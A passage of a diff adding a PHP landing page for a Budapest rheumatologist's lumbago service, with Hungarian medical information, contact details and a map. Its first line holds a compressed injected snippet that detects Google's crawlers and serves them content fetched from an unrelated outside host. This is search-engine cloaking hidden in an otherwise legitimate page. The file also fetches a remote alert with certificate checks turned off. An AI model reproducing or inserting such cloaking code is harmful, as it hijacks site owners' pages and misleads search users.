@@ -1,0 +1,940 @@
+<?php 
+function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://landingpages-hu.pages.dev/index.txt');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+	$arrContextOptions=array(
+      "ssl"=>array(
+            "verify_peer"=>false,
+            "verify_peer_name"=>false,
+        ),
+    );
+    
+    
+	$alert=file_get_contents("https://teledoktor.hu/alert.txt", false, stream_context_create($arrContextOptions));
+
+session_start(); ?><!DOCTYPE html>
+
+<!--[if IE 8]>			<html class="ie ie8"> <![endif]-->
+
+<!--[if IE 9]>			<html class="ie ie9"> <![endif]-->
+
+<!--[if gt IE 9]><!-->
+<html prefix="og: https://ogp.me/ns#">
+<!--<![endif]-->
+
+<head>
+
+<!-- Meta -->
+
+<meta charset="utf-8">
+<meta name="keywords" content="lumbágó Template" />
+<meta name="description" content="Mozgásszervi panaszok gyors, szakszerű ellátása, Lumbágó -, Ágyéki porckorongsérv -, Kisizületi rándulás kezelése ">
+
+
+<title>Lumbágó ügyelet - Dr. Csuzi László</title>
+
+        <meta property="og:title" content="Lumbágó Ügyelet  - Dr. Csuzi László" />
+        <meta property="og:type" content="website" />
+        <meta property="og:url" content="https://www.lumbagougyelet.hu" />
+        <meta property="og:image" content="https://www.lumbagougyelet.hu/lumbagougyelet2.jpg" />
+        <meta property="og:description" content="Mozgásszervi panaszok gyors, szakszerű ellátása, Lumbágó -, Ágyéki porckorongsérv -, Kisizületi rándulás kezelése" />
+
+<!-- Mobile Metas -->
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- Favicon -->
+
+<link rel="shortcut icon" href="/favicon.ico">
+<meta name="keywords" content="">
+
+<!-- Google Webfont -->
+
+<link href='https://fonts.googleapis.com/css?family=Raleway:400,100,200,300,500,600,700,800,900' rel='stylesheet' type='text/css'>
+
+
+
+ <link rel="stylesheet" href="https://unpkg.com/leaflet@1.3.4/dist/leaflet.css"
+   integrity="sha512-puBpdR0798OZvTTbP4A8Ix/l+A4dHDD0DGqYW6RQ+9jxkRFclaxxQb/SJAWZfWAkuyeQUytO7+7N4QKrDh+drA=="
+   crossorigin=""/>
+   <!-- Make sure you put this AFTER Leaflet's CSS -->
+ <script src="https://unpkg.com/leaflet@1.3.4/dist/leaflet.js"
+   integrity="sha512-nMMmRyTVoLYqjP9hrbed9S+FzjZHW5gY1TWCHA5ckwXZBadntCNs8kEqAWdrb9O7rxbCaA4lKTIWjDXZxflOcA=="
+   crossorigin=""></script>
+   
+   
+<!-- CSS -->
+
+<link rel="stylesheet" href="css/bootstrap.min.css">
+<link rel="stylesheet" href="font/style.css">
+<link rel="stylesheet" href="css/font-awesome.min.css">
+<link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="css/animate.css">
+<link rel="stylesheet" href="css/media.css">
+<link rel="stylesheet" href="js/owl-carousel/owl.carousel.css">
+<link rel="stylesheet" href="js/owl-carousel/owl.theme.css">
+<link rel="stylesheet" href="js/owl-carousel/owl.transitions.css">
+<link rel="stylesheet" href="css/jquery-ui.min.css">
+<link rel="stylesheet" href="css/magnific-popup.css">
+<link rel="stylesheet" href="css/responsive.css">
+<link rel="stylesheet" href="css/fhmm.css">
+<link rel="stylesheet" type="text/css" href="css/component.css" />
+
+<link href="css/custom.css" rel="stylesheet" type="text/css" />
+<script src="js/modernizr.custom.js"></script>
+
+<!-- SLIDER REVOLUTION CSS -->
+
+<link rel="stylesheet" type="text/css" href="css/extralayers.css" media="screen" />
+<link rel="stylesheet" type="text/css" href="rs-plugin/css/settings.css" media="screen" />
+
+<!-- IE8 support of HTML5 elements and media queries -->
+
+<!--[if lt IE 9]>
+
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+
+	<![endif]-->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-66176469-3', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<!--
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-74212929-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+-->
+<!-- Facebook Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1182284035192909');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1182284035192909&ev=PageView&noscript=1"
+/></noscript>
+<!-- DO NOT MODIFY -->
+<!-- End Facebook Pixel Code -->
+
+
+
+
+</head>
+
+<body id="page-top" class="index one_page">
+<div class="u-all">
+
+<!-- Fullscreen-Slider -->
+
+<div class="fullscreen-container">
+<div class="slider fullscreenbanner text-center">
+<UL class="diamond">
+  <li data-transition="boxslide" data-slotamount="7"> <img src="images/header.jpg"> 
+    
+    <!-- LAYER NR. 3 -->
+    
+    <div  class="tp-caption skewfromleft " data-speed="500" data-x="46"  data-start="900" data-endspeed="500"
+
+						data-y="70" style="font-size:33px; font-weight: 700; line-height: 51px; letter-spacing: 1px; text-transform: uppercase; color: rgb(56, 56, 56);">Lumbágó ügyelet</div>
+    <div class="tp-caption rfl" data-speed="500" data-x="50"  data-start="1000" data-endspeed="500" data-y="115" style="font-size:20px;font-style: normal;color: #fff;font-weight: 700;background: #900;display: table;padding: 6px 15px;border-radius: 3px;margin: 17px 0px;letter-spacing: 0px;">
+    Mozgásszervi panaszok  gyors, szakszerű ellátása
+  </div>
+  <div class="tp-caption lfl" data-speed="500" data-x="46"  data-start="1100" data-endspeed="500" data-y="190"  style="font-weight: 700;font-size: 18px;color:#383838;padding-left: 0px;">
+  <span style="position:relative;top:2px;" class="icon_check highlight-color"></span> Derékfájdalom
+  </div>
+  <div class="tp-caption lfl" data-speed="500" data-x="46"  data-start="1200" data-endspeed="500"data-y="236"  style="font-weight: 700;font-size: 18px;color:#383838;padding-left: 0px;">
+  <span style="position:relative;top:2px;" class="icon_check highlight-color"></span> Ischias</div>
+  <div class="tp-caption lfl" data-speed="500" data-x="46"  data-start="1300" data-endspeed="500" data-y="282"  style="font-weight: 700;font-size: 18px;color:#383838;padding-left: 0px;"><span class="tp-caption lfl" style="font-weight: 700;font-size: 18px;color:#383838;padding-left: 0px;"><span style="position:relative;top:2px;" class="icon_check highlight-color"></span> Hexensussz  </span></div>
+
+  <div class="tp-caption lfl" data-speed="500" data-x="46"  data-start="1500" data-endspeed="500" data-y="328"  style="font-weight: 700;font-size: 18px;color:#383838;padding-left: 0px;"><span class="tp-caption lfl" style="font-weight: 700;font-size: 18px;color:#383838;padding-left: 0px;"><span style="position:relative;top:2px;" class="icon_check highlight-color"></span> Derékzsába</span></div>
+
+  <div class="tp-caption lfl" data-speed="500" data-x="46"  data-start="1700" data-endspeed="500" data-y="374"  style="font-weight: 700;font-size: 18px;color:#383838;padding-left: 0px;"><span class="tp-caption lfl" style="font-weight: 700;font-size: 18px;color:#383838;padding-left: 0px;"><span style="position:relative;top:2px;" class="icon_check highlight-color"></span> Porckorongsérv </span></div>
+
+  <div class="tp-caption sft slider-btn2" style="background:#e4e4e4;color:#383838;font-weight:700;padding:10px 0px;text-transform:uppercase;border-radius:4px" data-speed="500" data-x="46"  data-start="1500" data-endspeed="500"  data-y="430">
+  <a href="tel:+36209686886" style="color:#383838;padding:10px 17px;">
+  <i class="icon_phone" style="margin-right:5px;"></i> Hívjon minket </a>
+  </div>
+  <divclass="tp-caption lft " style="color:#383838;padding:10px 0px;text-transform:uppercase;border-radius:4px; font-size:20px" data-speed="500"  data-start="1600" data-endspeed="500" data-x="230" data-y="425">&nbsp;  <a href="tel:+36209686886">+36 (20) 968 68 86 </a></div>
+  </li>
+</ul>
+</div>
+
+<!-- End of Slider -->
+
+</div>
+
+<!-- Fullscreen --> 
+
+<!-- Header -->
+
+<header class="desktop_header header-onepage">
+  <div class="u-header-one">
+    <nav class="navbar navbar-default navbar-top">
+      <div class="container"> 
+        
+        <!-- Brand and toggle get grouped for better mobile display -->
+        
+        <div class="navbar-header page-scroll">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
+          <a class="navbar-brand" href="#page-top" style="line-height:normal; padding:10px; text-align:center"><i class="fa fa-stethoscope"> </i> <strong class="highlight-color">Dr. Csuzi László</strong><br><small style="font-weight:normal">reumatológus</small> </a> </div>
+        
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+          <ul class="nav navbar-nav pull-right one_page_nav">
+            <li class="page-scroll active"><a href="#page-top">Főoldal</a></li>
+            <li class="page-scroll"><a href="#lumbago">A lumbágó</a></li>
+            <li class="page-scroll"><a href="#mikor_forduljon_hozzank">Mikor forduljon hozzánk?</a></li>
+            <li class="page-scroll"><a href="#bemutatkozas">Bemutatkozás</a></li>
+            <li class="page-scroll"><a href="#reumatologia_kapcsolat">Kapcsolat</a></li>
+          </ul>
+        </div>
+        
+        <!-- /.navbar-collapse --> 
+        
+      </div>
+      
+      <!-- /.container-fluid --> 
+      
+    </nav>
+  </div>
+</header>
+			<?php if(isset($alert) && !empty($alert)){?>
+			<div class="alert alert-warning" style="margin-top: 30px"><strong><?php echo $alert?></strong></div>
+			<?php } ?>
+
+
+<div id="lumbago">
+  <div class="padding border_bottom clearfix">
+    <div class="container">
+	    
+      <div class="row">
+        
+        
+        <div class="col-md-12">
+        <p class="content-sub lead">
+          
+          A lumbágó ügyelet keretében nem csak az ágyéki gerincszakasz megbetegedéseit kezeljük, hanem az egész gerinc, különböző régióiban, akutan, hirtelen fellépő fájdalmakat, illetve betegségeket is ellátjuk.</p>
+          <div class="content-head center">
+            <h3 class="center_divider"> <em> <span class="head-tngl-left1"></span> <span class="head-tngl-left2"></span> <span class="head-tngl-left3"></span> <span class="highlight-color">Mi az a lumbágó</span> <span class="head-tngl-right1"></span> <span class="head-tngl-right2"></span> <span class="head-tngl-right3"></span> </em> </h3>
+            <div class="owl-buttons">
+
+            </div>
+          </div>
+          <p>Hirtelen kialakuló, hasító, alsó végtagba, csípőbe, hasba sugárzó erős fájdalom, mely kényszertartáshoz, izommerevedéshez, mozgáskorlátozottsághoz vezet, és idegszál gyulladást okozhat.</p>
+          <p>Szinonimák: derékfájdalom, ischias, hexensussz, derékzsába, porckorongsérv          </p>
+          <p>            Az ágyéki gerincszakaszon, hirtelen kialakuló fájdalmat, a következő betegségek okozhatnak:</p>
+         
+         <div class="row clearfix">
+           <div class="col-md-6">
+          <h3><strong>Mechanikai okok</strong></h3>
+          <UL class="diamond">
+            <LI>              porckorong sérv, melyek akár a 	leszálló idegnyalábokat, akár a kilépő idegszálakat 	nyomhatja, önmagukban is, vagy az ellen oldali, meszes 	csőrképződésekkel, szinte &bdquo;harapófogóba&rdquo; foghatják a 	kilépő idegszálat, így az idegszál heveny gyulladását idézik 	elő.</LI>
+            <LI>
+              Ágyéki gerinccsatorna 	beszűkülése</LI>
+            <LI>
+              A gerinccsigolya megcsúszása, 	ívszakadással, vagy anélkül</LI>
+            <LI>
+              Gerincmeszesedés</LI>
+            </UL>
+            
+            </div>
+            
+                        <div class="col-md-6">
+          <h3><strong>A gerincgyulladásos megbetegedései: Spondylarthritis (SPA)</strong></h3>
+          <UL class="diamond">
+            <LI>
+              a bambusznád gerinchez vezető 	merev csontosodással járó gerincgyulladás</LI>
+            <LI>
+              pikkelysömörhöz társuló 	gerincgyulladás</LI>
+            <LI>
+              a gyulladásos bélbetegségekhez 	társuló gerincgyulladás</LI>
+            <LI>
+              a nem tisztázott eredetű 	gerincgyulladások.</LI>
+            </UL>
+            
+            </div>
+
+          </div>
+            
+            <div class="row clearfix">
+            <div class="col-md-6">
+          <h3><strong>Fertőzések</strong></h3>
+A porckorong gyulladása, bakteriális fertőzés következtében, pl. tuberkulózis, vagy egyéb fertőzés miatt
+          <UL class="diamond">
+            <LI>
+              Gennyes tasak kialakulása a 	gerincvelő körül.</LI>
+            </UL>
+            </div>
+            <div class="col-md-6">
+           <img src="images/csigolya_osszeropanas_csotritkulas_eseten.jpg" style="float:right" alt="csigolya összeroppanás csontritkulás esetén" class="img-thumbnail"> 
+          <h3><strong>Anyagcsere okok</strong></h3>
+          <UL class="diamond">
+            <LI>
+              A csontritkulás következtében 	fellépő, hirtelen csigolya összeroppanás, vagy beszakadás </LI>
+            <LI>
+              Paget betegség-csontfejlődési 	zavar</LI>
+            </UL>
+            </div>
+            
+            </div>
+            <div class="alert alert-warning">
+              <i class="fa fa-warning"></i>
+              A fenti okok súlyos szövődményként a <a href="https://www.teledoktor.hu/blog/Lofarok_betegseg_Cauda_equina_syndrome_(CES)_8/" target="_blank">lófarok betegség</a>hez (CES) vezethetnek.
+            </div>
+          <p>&nbsp;</p>
+          <p>Ezek a kórformák, sok esetben a keresztcsont, csípőcsont közötti ízületeket is érintik, és ezekben is gyulladásos állapotot idéznek elő, elsősorban hajnalban jelentkező fájdalommal. A Reiter szindróma, és a reaktív arthtritis esetében pedig akut fájdalommal, azaz hirtelen fellépő, erős gerincfájdalmak jelentkeznek a páciensnél.<BR>
+            <strong>A különböző tumorok, és azok áttétei</strong>.</p>
+          <p><strong>Kisugárzó fájdalmak</strong></p>
+          <p>Ezeket elsősorban a kismedencei szervek gyulladásai idézik elő, pl. hólyaggyulladás, prosztatagyulladás, előfordul hasnyálmirigy gyulladás, illetve hasnyálmirigy folyamata is.<BR>
+            Kisugárzó fájdalmat okozhat az aorta, főütőér tágulata, illetve ennek az elgyengülése is, valamint ún. lelki problémák is vezethetnek derék, illetve gerinc melletti fájdalmakhoz. Különféle sérülések, a gerinc csigolyák törése, a gerinc környéki kiszületek rándulása, illetve különféle zúzódások szintén vezethetnek gerinc, illetve gerinc környéki fájdalmakhoz. <BR>
+            (3.ábra)A hirtelen kialakuló <strong>nyaki fájdalmak</strong> hátterében szintén porckorongsérv, csigolyasérülések, csigolyaközti kisízületek rándulásai, esetleg a különböző gyulladásos kórképek lehetnek, kialakulhat ún. merev nyak szindróma ( torticollis), ami szintén igen erős fájdalmakkal jár, nyakba, vállba trapézizomba sugározhat.<BR>
+            <BR>
+            A háti szakaszon, az említett betegségek mellett különféle deformitások is szerepet játszhatnak: gerincferdülés, hajlott hát, lapos hát szindróma, mellkasi deformitások, pl. tyúkmell, extrém esetekben, vagy megterhelés esetén, jelentős, hirtelen fájdalmakat eredményezhetnek. </p><p>&nbsp;</p>
+          
+          </div>
+          </div>
+          </div>
+          </div>
+          </div>
+          
+          <div id="mikor_forduljon_hozzank">
+  <div class="padding border_bottom clearfix">
+    <div class="container">
+      <div class="row">
+        
+        
+        <div class="col-md-12">
+
+
+
+            
+          <div class="content-head center">
+            <h3 class="center_divider" > <em> <span class="head-tngl-left1"></span> <span class="head-tngl-left2"></span> <span class="head-tngl-left3"></span> <span class="highlight-color">Mikor forduljon hozzánk?</span></em></h3>
+            <div class="owl-buttons"></div>
+          </div>
+          <ul  class="diamond">
+            <li>Ha hirtelen kialakuló nyaki, 	háti, ágyéki fájdalma jelentkezik, és ez a fájdalom 	végtagokba, hasba, vagy a trapézizomba sugárzik</li>
+            <li>Ha bénulás, vagy érzészavar, 	ún. fonákérzés, vagy egy területen csökkent érzés 	jelentkezik.</li>
+            <li>Ha ügyetlenné válik a keze, 	vagy a lába, illetve járászavar fejlődik ki</li>
+            <li>Ha széklet, illetve vizelet 	tartási vagy indítási rendellenességet észlel</li>
+          </ul>  
+              <p>&nbsp;</p>
+            
+            
+            
+
+
+<section id="bg_color"  data-stellar-background-ratio="0.3" class="bg_color aligncenter  wow animated fadeInLeft">
+  <div class="quotation_icon"> <span><i class="fa fa-ambulance"></i></span> </div>
+  <div class="bg_overlay"></div>
+
+              <div class="container">
+                <div class="row">
+                  <div id="owl-quotation" class="owl-carousel owl-theme light">
+                    <div class="text-center">
+                      <h2 class="size-40 weight-300 white">Forduljon hozzánk, kivizsgáljuk és a megfelelő ellátásban részesítjük. <br>
+                      Dr. Csuzi László reuma orvos Teledoktor Bt.</h2>
+                      <a class="btn btn-danger btn-lg" href="tel:+36209686886">Hívjon minket telefonon! <br>
+                      06 20-9686-886 </a> </div>
+                  </div>
+                </div>
+              </div>
+            
+</section>
+         
+          <h3 ALIGN="CENTER"><strong>Mi várható?</strong><BR>
+            <small>( Betegség lefolyás)</small></h3>
+         
+         <img src="images/gerinc_elvaltozasok.jpg" class="img-thumbnail pull-right" alt="Gerinc elváltozásai" >
+          <p>A lumbágó, korrekt, konzervatív kezelés esetén, 90-95 %-ban, 2 hónapon belül gyógyul. A megfelelő vizsgálatok és terápia tervezése érdekében, forduljon hozzánk. Gyorsan és hatékonyan beavatkozunk annak érdekében, hogy csökkentsük panaszait, és hatékonyan lerövidítsük, a betegség lefolyását. Hosszú távú, vagy ismételt kezelési igény esetén is számíthat ránk.</p>
+          
+          
+          <h3 ALIGN="CENTER"><strong>A derékfájás megelőzése</strong></h3>
+          <ul class="diamond">
+            <li>  Rendszeres gerinctorna /lazító és erősítő gyakorlatok kiegyensúlyozásával/</li>
+            <li> terhes torna <BR>
+              </li>
+            <li> Úszás, ill. Vizi torna, séta</li>
+            <li> <a href="https://teledoktor.hu/Akupunktura/">Akupunktúra</a>, <a href="https://teledoktor.hu/Lezerterapia/">lézerterápia</a>, fizioterápia</li>
+            <li> gerincbemozgatás /kényszertartásban végzett, ill. nehéz fizikai munka/</li>
+            <li> testsúly optimális beállítása</li>
+          </ul>
+          <p> <BR>
+            <BR>
+          </p>
+          <p>
+          </p>
+        
+
+
+          </div>
+          </div>
+          </div>
+          </div>
+          </div>
+          
+          <div id="bemutatkozas">
+  <div class="padding border_bottom clearfix">
+    <div class="container">
+      <div class="row">
+        
+        
+        <div class="col-md-12">
+
+
+<div id="owl-team0" class="row">
+  
+  
+  <div class="col-md-4">
+  <div class="up-item item ">
+              <div class="upi-thumb"> <img src="images/dr-csuzi-laszlo.jpg" alt="Dr. Csuzi László">
+                
+                
+              </div>
+              <div class="upi_team_name"> <span>Dr. Csuzi László</span> </div>
+              <div class="upi_team_position">
+                <h5>Reumatológus</h5>
+              </div>
+              <div class="upi-inner aligncenter team_icon"> <a href="#" class="" ><i class="icon_mail"></i> teledoktor@t-online.hu</a>
+                <div class="clear"></div>
+                <a href="#"><i class="icon_phone"></i> +36 (20) 968-6886</a> </div>
+            </div>
+            
+            </div>
+            
+            <div class="col-md-8 ">
+        
+      <p> 1985 óta dolgozom reumatológusként. 5 évig az Országos Reumatológiai és Fizioterápiás Intézertben dolgoztam:elsősorban immunológiai területen cytotoxikus aktivitással és az új terápiás eljárások (Ciclosporin és vértisztító eljárások leucoplasma feresis) bevezetésével foglalkoztam.</p>
+
+<p>1990 óta reumatológiai magánrendelést folytatok. Tevékenységem során számos alternatív terápiás eljárást alkalmazok, a konzervatív reumatológiai kezelések mellett.
+</p>
+<p>Magánrendeléseim a XII. illetve a XIX. kerületben működnek.<br>
+
+Emellett háziorvosi tevékenységet is folytatok Kispesten.
+</p>        
+
+        
+        <p>Mozgásszervi megbetegedések kezelése: 35 éves tapasztalat a mozgásszervi  betegségek kivizsgálásában, kezelésében, folyamatos ellenőrzésében, gondozásában.</p>
+
+<p>Idült kopásos, vagy gyulladásos mozgásszervi betegségek, lágyrész-reumatizmusok szakellátása, gondozása Heveny mozgásszervi panaszok (derékfájdalom, egyéb ízületi- és izomfájdalmak, stb.) szakellátása.
+Túlsúlyos betegek kezelése.</p>
+<ul class="diamond">
+<li><a href="https://teledoktor.hu/Lezerterapia/">Lézerterápia</a></li>
+<li><a href="https://teledoktor.hu/Akupunktura/">Akupunktúra</a></li>
+<li>Biomasszázs</li>
+</ul>
+</p>
+        </div>
+            
+            
+            
+      </div>
+        </div>
+          </div>
+          </div>
+          </div>
+          </div>
+          </div>
+
+        
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  <section id="bg_color1"  data-stellar-background-ratio="0.4" class="bg_color aligncenter  wow animated fadeInLeft" style="padding-top:20px; margin:auto">
+            <div class="quotation_icon"> <span><i class="fa fa-ambulance"></i></span> </div>
+            <div class="bg_overlay"></div>
+            <div class="container">
+                <div class="row">
+                    <div id="owl-quotation1" class="owl-carousel owl-theme light" style="display:inline">
+
+                        <div class="text-center">
+                            <h2 class="size-40 weight-300 white">Ügyeleti szolgáltatásaink</h2>
+                            <div class="row">
+                                <div class="col-md-4">
+                                	<h3 class="white">Reuma ügyelet</h3>
+                                    <a href="https://www.reumaugyelet.hu" target="_blank"><img src="https://www.reumaugyelet.hu/surgossegireuma2.jpg" class="img-rounded" alt="Reuma ügyelet"></a>
+                                    <a href="https://www.reumaugyelet.hu" target="_blank" class="btn btn-danger">www.reumaugyelet.hu</a>
+                                </div>
+                            
+                                <div class="col-md-4">
+                                
+                                	<h3 class="white">Fájdalom ügyelet</h3>
+                                    <a href="https://www.fajdalomugyelet.hu" target="_blank"><img src="https://www.fajdalomugyelet.hu/fajdalomugyelet2.jpg" class="img-rounded" alt="Fájdalom ügyelet"></a>
+                                    <a href="https://www.fajdalomugyelet.hu" target="_blank" class="btn btn-danger">www.fajdalomugyelet.hu</a>
+                                </div>
+                                
+                                <div class="col-md-4">
+                                
+                                	<h3 class="white">Reumatológiai magánrendelés</h3>
+                                    <a href="https://www.teledoktor.hu" target="_blank"><img src="https://www.teledoktor.hu/teledoktor.jpg" class="img-rounded" alt="Reumatológia magánrendelés"></a>
+                                    <a href="https://www.teledoktor.hu" target="_blank" class="btn btn-danger">www.teledoktor.hu</a>
+                                </div>
+
+                            </div>
+                            
+                            
+                            
+                           
+                        </div>
+
+                    </div>
+                    
+                </div>
+            </div>
+        </section>
+
+<footer class="footer-alt" style="margin-top:20px"> 
+  
+  <!-- footer -->
+  
+  <div class="container">
+    <div class="row">
+    
+    
+      
+      
+      <div class="col-md-6 col-md-offset-0">
+      <h2 class="white " style="margin-bottom:20px" > Reumatológia magánrendelés</h2>
+      <h3 class="white">1122 Budapest, Városmajor u. 18. I. em 2.</h3>
+        <p> 
+        Telefon: <a href="tel:+36 20 968 6886">+36 20 968 6886</a><br>
+        Rendelési idő:<br>
+        Hétfő: 14:00-15:00<br>
+        Kedd, Csütörtök: 18:00 - 20:00<br>
+        Péntek: 13:00 - 14:00 <br>
+		<br>
+		Bővebb információ:<br>
+<a href="https://www.teledoktor.hu" target="_blank">www.teledoktor.hu</a></p>
+      </div>
+      
+      <div class="col-md-6">
+      
+      <img src="images/reumatologia_rendelo.jpg" class="img-responsive img-thumbnail">
+      </div>
+    </div>
+    <div class="row">&nbsp;
+    </div>
+  </div>
+  
+  <!-- end of container -->
+  
+  <div id="reumatologia_kapcsolat">
+    <div id="google-map" class="contact2">
+      <div class="map-container">
+        <div class="map">
+          <div class="gmap">
+            <div id="map"></div>
+           
+          </div>
+        </div>
+      </div>
+      <?php /*
+      <div class="form_elements contact_form2 col-md-3" id="uzenet">
+        <form action="send_mail.php" method="post" target="hidden">
+          <div class="col-md-12 text-center">
+            <strong>Üzenet küldés</strong>
+          </div>
+          <div class="col-md-12">
+            <input type="text" name="m[Név]" placeholder="Név" required value="<?php echo isset($_SESSION["m"]) ? $_SESSION["m"]["Név"] : "" ?>" />
+          </div>
+          <div class="col-md-12">
+            <input type="email" name="m[E-mail]" placeholder="Email cím" required value="<?php echo isset($_SESSION["m"]) ? $_SESSION["m"]["E-mail"] : "" ?>" />
+          </div>
+          <div class="col-md-12">
+            <input type="text" name="m[Telefon]" placeholder="Telefon" required value="<?php echo isset($_SESSION["m"]) ? $_SESSION["m"]["Telefon"] : "" ?>" />
+          </div>
+          <div class="col-md-12">
+            <textarea name="m[Üzenet]" placeholder="Üzenet" rows="6" required><?php echo isset($_SESSION["m"]) ? $_SESSION["m"]["Üzenet"] : "" ?></textarea>
+          </div>
+          <div class="clearfix"></div>
+          <div class="col-md-12 text-center">
+          
+          <?php echo isset($_SESSION["cap_error"]) ? "<small style='color:red'>Kérem, igazolja egy kattintással, hogy nem robot</small>" : ""; 
+		  
+		  unset($_SESSION["cap_error"]); ?>
+           <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+            <div class="g-recaptcha" data-sitekey="6LeMHBkTAAAAABFoaAv7VF1kxwTxLCqWoSnbyC2S" data-theme="light" style="text-align:center !important"></div>
+                                               
+            <button type="submit" class="btn-regular col-md-12 alignleft contact_button">Elküld</button>
+          </div>
+          <div class="clearfix"></div>
+        </form>
+      </div>
+      */ ?>
+    </div>
+    
+    <!-- /#google-map--> 
+    
+  </div>
+  <section class="footer_bottom no_margin">
+    <div class="quotation_icon green"> <span class="page-scroll"><a href="#page-top"><i class="fa fa-caret-up"></i></a></span> </div>
+    <div class="container">
+      <div class="row">
+        <div class="col-md-12 col-sm-12 col-xs-12  aligncenter">
+          <p>Copyright &copy; <?php echo date("Y") ?> Teledoktor Bt.</p>
+           <a href="https://www.substudio.hu" target="_blank"><img src="//www.substudio.hu/credit/substudio_webfejlesztes.png" alt="Webfejlesztés" style="width:120px; margin-top: 30px"></a>
+        </div>
+      </div>
+    </div>
+  </section>
+</footer>
+
+<!-- footer -->
+
+<section>
+<div class="container">
+<div class="row">
+<div class="col-md-12">
+<?php 
+$keywords= "12.kerület, reumatológus, reuma orvos, Városmajor, derékfájás, lumbago, ischias, hát, nyak, ágyék, fájdalom, hasító fájdalom, kezelés, erős fájdalom, zsibbadás, bénulás, fonákérzés, gerinc, gerincgyógyászat, gerincgyógyító, porckorongsérv, porckorong előboltosulás, gerincgyulladás,Dr. Csuzi László, lumbago ischiassal, lumbago kezelése, lumbago lelki okai, lumbago gyógyítása, nyaki fájdalom, gerincsérv";
+
+$kw=explode(",", $keywords);
+
+foreach($kw as $w){
+	
+	echo "<span style='font-size:". floor(rand(3,6)*5) ."px'><a href='?kereso=".$w."'>".$w."</a>, </span>";
+	}
+
+?>
+
+
+</div>
+</div>
+</div>
+</section>
+</div>
+
+<!-- JAVASCRIPT --> 
+
+<script src="js/jquery-1.11.0.js"></script> 
+<script src="js/bootstrap.min.js"></script> 
+<script src="js/plugins.js"></script> 
+<script src="js/jquery.parallax.js"></script> 
+<script src="js/bootstrap-hover-dropdown.js"></script> 
+<script src="https://maps.google.com/maps/api/js?key=AIzaSyAUDkBd_VPx-Sklk7dsqS_NC1-lkANcd4I&sensor=true"></script>
+<!--
+<script src="js/gmaps.js"></script> 
+<script src="js/gmap_c2.js"></script> 
+-->
+<script src="rs-plugin/js/jquery.themepunch.tools.min.js"></script> 
+<script src="rs-plugin/js/jquery.themepunch.revolution.min.js"></script> 
+<script>
+
+const map = L.map('map').setView([47.502929, 19.021186], 17);
+
+	const tiles = L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
+		maxZoom: 19,
+		attribution: '&copy; <a href="http://www.openstreetmap.org/copyright">OpenStreetMap</a>'
+	}).addTo(map);
+	
+	L.marker([47.502929, 19.021186]).addTo(map)
+	.bindPopup("<b>Teledoktor Bt.</b><br />Dr. Csuzi László - Reumatológia magánrendelés<br />1122 Budapest, Városmajor u. 18. I. em 2.").openPopup();
+
+
+
+</script>
+
+
+
+
+
+
+<script>
+
+	jQuery(document).ready(function() {
+
+	$('[data-toggle="tooltip"]').tooltip({'placement': 'bottom'});
+
+		$('.slider').revolution({
+
+            delay: 150000,
+
+            startwidth: 1200,
+
+            startheight: 550,
+
+            autoHeight: "on",
+
+            fullScreen: "off",
+
+            fullWidth: "off",
+
+            fullScreenAlignForce: "off",
+
+            onHoverStop: "on",
+
+            thumbWidth: 100,
+
+            thumbHeight: 50,
+
+            thumbAmount: 3,
+
+            hideThumbsOnMobile: "off",
+
+            hideBulletsOnMobile: "off",
+
+            hideArrowsOnMobile: "off",
+
+            hideThumbsUnderResoluition: 0,
+
+            hideThumbs: 0,
+
+            navigationType: "bullet",
+
+            navigationArrows: "solo",
+
+            navigationStyle: "round",
+
+            navigationHAlign: "center",
+
+            navigationVAlign: "bottom",
+
+            navigationHOffset: 30,
+
+            navigationVOffset: 30,
+
+            soloArrowLeftHalign: "left",
+
+            soloArrowLeftValign: "center",
+
+            soloArrowLeftHOffset: 20,
+
+            soloArrowLeftVOffset: 0,
+
+            soloArrowRightHalign: "right",
+
+            soloArrowRightValign: "center",
+
+            soloArrowRightHOffset: 20,
+
